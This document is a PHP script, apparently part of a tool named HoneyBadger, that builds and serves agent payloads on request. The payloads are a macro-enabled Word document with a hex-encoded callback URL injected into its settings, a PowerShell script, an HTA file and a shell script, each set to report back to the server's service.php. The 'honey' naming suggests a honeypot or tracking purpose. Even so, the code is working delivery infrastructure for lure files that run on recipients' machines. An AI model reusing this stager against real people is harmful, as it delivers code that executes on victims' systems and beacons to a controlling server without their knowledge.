<?php

function url(){
  return explode("/retrieve.php", sprintf(
    "%s://%s%s",
    isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' ? 'https' : 'http',
    $_SERVER['SERVER_NAME'],
    $_SERVER['REQUEST_URI']
  ))[0];
}

$conf = parse_ini_file("admin/badger.ini");

if (isset($conf['callback'])){
$callback = $conf['callback'];
} else {
$callback = url();
}

if (isset($conf['target'])){
$target = $conf['target'];
} else {
$target = "default";
}

if(isset($_REQUEST['docm'])){

$callback = $callback . "/retrieve.php?ps1";
$callback = bin2hex($callback);
file_put_contents('admin/agents/docm/word/settings.xml', str_replace("placeholder.placeholder.placeholder", $callback, file_get_contents('admin/agents/docm/word/settings.xml')));

// Get real path for our folder
$rootPath = realpath('admin/agents/docm');

// Initialize archive object
$zip = new ZipArchive();
$zip->open('admin/agents/honey.docm', ZipArchive::CREATE | ZipArchive::OVERWRITE);

// Create recursive directory iterator
/** @var SplFileInfo[] $files */
$files = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($rootPath),
    RecursiveIteratorIterator::LEAVES_ONLY
);

foreach ($files as $name => $file)
{
    // Skip directories (they would be added automatically)
    if (!$file->isDir())
    {
        // Get real and relative path for current file
        $filePath = $file->getRealPath();
        $relativePath = substr($filePath, strlen($rootPath) + 1);

        // Add current file to archive
        $zip->addFile($filePath, $relativePath);
    }
}

// Zip archive will be created only after closing object
$zip->close();
file_put_contents('admin/agents/docm/word/settings.xml', str_replace($callback, "placeholder.placeholder.placeholder", file_get_contents('admin/agents/docm/word/settings.xml')));

$file = 'admin/agents/honey.docm';
if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}


} else if (isset($_REQUEST['ps1']))  {
	$callback = $callback . "/service.php";
	echo str_replace("target.placeholder",$target,str_replace("placeholder.placeholder.placeholder",$callback,file_get_contents("admin/agents/honeybadger.ps1")));

} else if (isset($_REQUEST['ps1d'])) {
	$callback = $callback . "/service.php";
        
	$file = 'admin/agents/honeybadger.ps1';
        if (file_exists($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($file));

	
		echo str_replace("target.placeholder",$target,str_replace("placeholder.placeholder.placeholder",$callback,file_get_contents($file)));

		}


}else if (isset($_REQUEST['hta'])) {
	$callback = $callback . "/retrieve.php?ps1";


	$file = 'admin/agents/honey.hta';
	if (file_exists($file)) {
    		header('Content-Description: File Transfer');
    		header('Content-Type: application/octet-stream');
    		header('Content-Disposition: attachment; filename="'.basename($file).'"');
    		header('Expires: 0');
    		header('Cache-Control: must-revalidate');
    		header('Pragma: public');
    		header('Content-Length: ' . filesize($file));
    		echo str_replace("%hrefString%", $callback, file_get_contents($file));
    		exit;
}

} else if (isset($_REQUEST['sh'])) {
        $callback = $callback . "/service.php";

        $file = 'admin/agents/honey.sh';
        if (file_exists($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($file));


                echo str_replace("target.placeholder",$target,str_replace("placeholder.placeholder.placeholder",$callback,file_get_contents($file)));

                }


}

?>
